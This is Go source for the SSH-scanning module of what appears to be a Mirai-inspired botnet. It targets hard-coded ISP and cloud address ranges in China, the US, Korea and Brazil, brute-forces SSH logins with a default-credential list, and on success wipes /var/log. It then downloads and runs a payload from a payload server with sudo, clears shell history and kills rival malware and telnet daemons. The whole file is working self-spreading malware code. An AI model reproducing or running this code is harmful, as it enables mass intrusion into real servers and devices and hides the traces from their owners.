package lib

import (
	"bytes"
	"fmt"
	"math/rand"
	"net"
	"strconv"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

var (
	wg        sync.WaitGroup
	randomNet string //0.0.0.0/0

	/*
		Thank you mirai for these usernames and passwords list (You are my inspirelation).
		Add more usernames and passwords in to the slice name "userList" and "paswdList".
	*/
	userList  = []string{"admin", "root", "user", "guest", "support", "login", "ubnt"}
	paswdList = []string{"", "admin", "root", "user", "guest", "support", "login", "ubnt", "password", "default", "1234", "12345", "123456", "12345678", "123456789", "1234567890", "pass", "54321", "123123", "888888", "666666", "00000000", "1111", "111111", "1111111", "ikwb", "system", "juantech", "realtek", "smcadmin", "hi3518", "admin1234", "jvbzd", "klv123", "klv1234", "xc3511", "vizxv", "xmhdipc", "Zte521", "7ujMko0admin", "7ujMko0vizxv"}
)

var ChinaNetwork = []string{

	//CHINANET Hubei province network.

	"116.211", //116.211.0.0/16
	"119.96",  //119.96.0.0/16
	"119.97",  //119.97.0.0/16
	"119.102", //119.102.0.0/16
	"58.49",   //58.49.0.0/16
	"58.53",   //58.53.0.0/16
	"221.234", //221.234.0.0/16
	"221.235", //221.235.0.0/16

	//CHINANET Guangdong province network.

	"14.116", //14.116.0.0/16
	"14.118", //14.118.0.0/16
	"14.127", //14.127.0.0/16
	"14.29",  //14.29.0.0/16
	"121.14", //121.14.0.0/16

	//CHINANET Jiangsu province network.

	"49.70",   //49.70.0.0/16
	"114.230", //114.230.0.0/16
	"114.239", //114.239.0.0/16
	"117.93",  //117.93.0.0/16
	"121.131", //121.131.0.0/16

	//CHINANET shandong province network.

	"140.246", //140.246.0.0/16
	"140.250", //140.250.0.0/16
	"182.42",  //182.42.0.0/16
	"182.43",  //182.43.0.0/16

	//China TieTong Telecommunications Corporation.

	"36.212",  //36.212.0.0/16
	"36.208",  //36.208.0.0/16
	"36.209",  //36.209.0.0/16
	"110.218", //110.218.0.0/16
	"110.219", //110.219.0.0/16
	"110.101", //110.101.0.0/16
	"110.105", //110.105.0.0/16
	"122.88",  //122.88.0.0/16
	"122.94",  //122.94.0.0/16
	"122.95",  //122.95.0.0/16
}

var AmericaNetwork = []string{

	//Amazon.com, Inc.

	"44.194", //44.194.0.0/16
	"44.235", //44.235.0.0/16
	"18.188", //18.188.0.0/16
	"18.191", //18.191.0.0/16
	"18.212", //18.212.0.0/16
	"18.217", //18.217.0.0/16
	"18.220", //18.220.0.0/16
	"18.222", //18.222.0.0/16
	"18.233", //18.233.0.0/16
	"54.83",  //54.83.0.0/16
	"54.86",  //54.86.0.0/16
	"54.214", //54.214.0.0/16
	"54.162", //54.162.0.0/16

	//DigitalOcean, LLC

	"64.225",  //64.225.0.0/16
	"64.62",   //64.62.0.0/16
	"64.90",   //64.90.0.0/16
	"104.198", //104.198.0.0/16
	"104.248", //104.248.0.0/16
	"35.188",  //35.188.0.0/16
	"35.194",  //35.194.0.0/16
	"35.202",  //35.202.0.0/16
	"35.224",  //35.224.0.0/16
	"35.233",  //35.233.0.0/16
	"35.239",  //35.239.0.0/16
	"34.68",   //34.68.0.0/16
	"34.72",   //34.72.0.0/16
	"34.138",  //34.138.0.0/16
	"165.227", //165.227.0.0/16

	//Google LLC

	"35.188",  //35.188.0.0/16
	"35.192",  //35.192.0.0/16
	"35.239",  //35.239.0.0/16
	"35.243",  //35.243.0.0/16
	"34.70",   //34.70.0.0/16
	"34.133",  //34.133.0.0/16
	"34.136",  //34.136.0.0/16
	"104.154", //104.154.0.0/16
	"104.197", //104.197.0.0/16
}

var KoreaNetwork = []string{

	//Korea Telecom

	"14.61",   //14.61.0.0/16
	"218.155", //218.155.0.0/16
	"27.236",  //27.236.0.0/16
	"27.238",  //27.238.0.0/16
	"125.153", //125.153.0.0/16
	"125.157", //125.157.0.0/16
	"119.212", //119.212.0.0/16
	"119.221", //119.221.0.0/16
	"175.239", //175.239.0.0/16
	"175.203", //175.203.0.0/16

	//SK Broadband, Inc.

	"58.122",  //58.122.0.0/16
	"58.124",  //58.124.0.0/16
	"118.221", //118.221.0.0/16
	"118.218", //118.218.0.0/16
	"211.201", //211.201.0.0/16
	"211.54",  //211.54.0.0/16
	"218.38",  //218.38.0.0/16
	"218.101", //218.101.0.0/16
	"175.112", //175.112.0.0/16
	"175.114", //175.114.0.0/16
	"175.124", //175.124.0.0/16
	"1.234",   //1.234.0.0/16
	"1.235",   //1.235.0.0/16

	//LG DACOM Corporation

	"211.60",  //211.60.0.0/16
	"112.216", //112.216.0.0/16
	"112.217", //112.217.0.0/16
	"122.221", //112.221.0.0/16
	"123.143", //123.143.0.0/16
	"106.242", //106.242.0.0/16
	"106.245", //106.245.0.0/16
	"1.211",   //1.211.0.0/16
	"1.215",   //1.215.0.0/16
	"118.130", //118.130.0.0/16
	"58.149",  //58.149.0.0/16

	//LGTELECOM

	"223.171", //223.171.0.0/16
}

var BrazilNetwork = []string{

	//CLARO S.A.

	"177.127", //177.127.0.0/16
	"177.193", //177.193.0.0/16
	"179.214", //179.214.0.0/16
	"187.105", //187.105.0.0/16
	"187.28",  //187.28.0.0/16
	"189.17",  //189.17.0.0/16
	"189.22",  //189.22.0.0/16
	"200.166", //200.166.0.0/16
	"200.179", //200.179.0.0/16
	"200.209", //200.209.0.0/16
	"200.230", //200.230.0.0/16
	"201.31",  //201.31.0.0/16
	"201.57",  //201.57.0.0/16

	//TELEFÔNICA BRASIL S.A

	"177.43",  //177.43.0.0/16
	"177.99",  //177.99.0.0/16
	"177.207", //177.207.0.0/16
	"179.80",  //179.80.0.0/16
	"179.85",  //179.85.0.0/16
	"179.150", //179.150.0.0/16
	"187.9",   //187.9.0.0/16
	"187.74",  //187.74.0.0/16
	"187.93",  // 187.93.0.0/16
	"189.108", //189.108.0.0/16
	"191.210", //191.210.0.0/16
	"191.32",  //191.32.0.0/16
}

var RandomNetwork = []string{randomNet}

func genRange(max, min int) string {
	rand.Seed(time.Now().UnixNano())
	return fmt.Sprint(rand.Intn(max+1-min) + min)
}

func (b *Bot) checkPort(addr string) string {
	ptrAddr := &addr
	b.timeout = 1 * time.Second
	conn, err := net.DialTimeout("tcp", *ptrAddr, b.timeout)
	if err != nil {
		return ""
	}
	conn.Close()
	return *ptrAddr
}

func (b *Bot) manageRange() string {
	var ipGen []string
	ipGen = append(ipGen, b.network, ".")
	for i := 0; i < 2; i++ {
		ipGen = append(ipGen, genRange(255, 0), ".")
	}
	ipGen[len(ipGen)-1] = ""
	ipGen = append(ipGen, ":22")
	return strings.Join(ipGen[0:7], "")
}

func sshConfig(sshName, sshPass string) *ssh.ClientConfig {
	config := &ssh.ClientConfig{
		User: sshName,
		Auth: []ssh.AuthMethod{
			ssh.Password(sshPass),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}
	return config
}

func (b *Bot) sshExecute(comd string, isRoot bool) {
	sshSesh, _ := b.session.NewSession()
	defer sshSesh.Close()
	var setSession bytes.Buffer
	sshSesh.Stdout = &setSession
	if isRoot {
		sshSesh.Run("echo '" + b.password +
			"' | sudo -S " + comd)
	}
	sshSesh.Run(comd)
}

func setScanSwitch() {
	if setCall, setKey := SetupCaller(); setKey {
		setCall.CallBot.scanSwitch = true
	}
}

func (b *Bot) runScan(scanNetwork []string, isRandom bool, nCores string) bool {
	for {
		for net := range scanNetwork {
			if isRandom {
				netID := genRange(254, 1) + "."
				if _, key := BlacklistIP[netID]; key {
					continue
				}
				RandomNetwork[0] = netID + genRange(255, 0)
			}
			b.network = scanNetwork[net]
			ip := b.manageRange()
			ptrIP := &ip

			if rtnIP := b.checkPort(*ptrIP); rtnIP == "" {
				b.checkPort(ip)
			} else {
				var isRun, isLogin bool
				for user := range userList {
					for paswd := range paswdList {
						if callSwitch, keySwitch := SetupCaller(); keySwitch {
							if isRun || callSwitch.CallBot.scanSwitch {
								return true
							}
						}
						sshConn, err := ssh.Dial("tcp", rtnIP, sshConfig(userList[user], paswdList[paswd]))
						b.session = sshConn
						b.password = paswdList[paswd]
						if err == nil {
							b.payload = genName('a') + genRange(10000, 1000)
							b.Report("🏳 " + nCores + "Installing bot: " + rtnIP)
							b.sshExecute("touch /tmp/.ffff; printf \""+b.password+"\\n"+rtnIP+"\\n\""+" > /tmp/.ffff", false)
							b.sshExecute("rm -rf /var/log/; wget -O ."+b.payload+" "+b.pServer+"; history -c; rm ~/.bash_history", true)
							b.sshExecute("fuser -k -n tcp 23; killall utelnetd telnetd i .i mozi.m Mozi.m mozi.a Mozi.a", true)
							b.sshExecute("chmod 700 ."+b.payload, true)
							go b.sshExecute("./."+b.payload+" &", true)
							isRun = true
							isLogin = true
						}
						if paswd == len(paswdList)-1 {
							if !isLogin {
								b.Report("🗑 " + nCores + "No auth match: " + rtnIP)
							}
						}
					}
				}
				continue
			}
			if callSwitch, keySwitch := SetupCaller(); keySwitch {
				if callSwitch.CallBot.scanSwitch {
					return true
				}
			}
		}
		if callSwitch, keySwitch := SetupCaller(); keySwitch {
			if callSwitch.CallBot.scanSwitch {
				return true
			}
		}
	}
}

func (b *Bot) Scanner() {
	if setCall, setKey := SetupCaller(); setKey {
		b.pServer = setCall.CallBot.pServer
		if value, key := ScanMap[setCall.CallBot.scanOpt]; key {
			/*
				Full cores scanning of a bot CPU
				Create a concurrence following by numbers of cores in CPU.

				Why use cores to scan instead of threads???
				1) Because i need to be careful about overheat problem of a bot device even threads in Go are light weight.
				2) For against excess flood on IRC server when bot device have more than 4 cores which is equal to cores times 2 when using threads.
			*/
			b.Report("👁 [" + strconv.Itoa(b.CPU) + "]CORES START SCANNING...")
			isBreak := make(chan bool)
			for i := 0; i < b.CPU; i++ {
				wg.Add(i)
				go func(ncpu int) {
					scanStatus := b.runScan(value.scanNetwork, value.isRandom, "[C"+strconv.Itoa(ncpu+1)+"]")
					if scanStatus {
						isBreak <- scanStatus
					}
				}(i)
			}
			if <-isBreak {
				b.Report("🛎 [" + strconv.Itoa(b.CPU) + "]CORES STOP SCANNING!!!")
			}
		}
	}
}
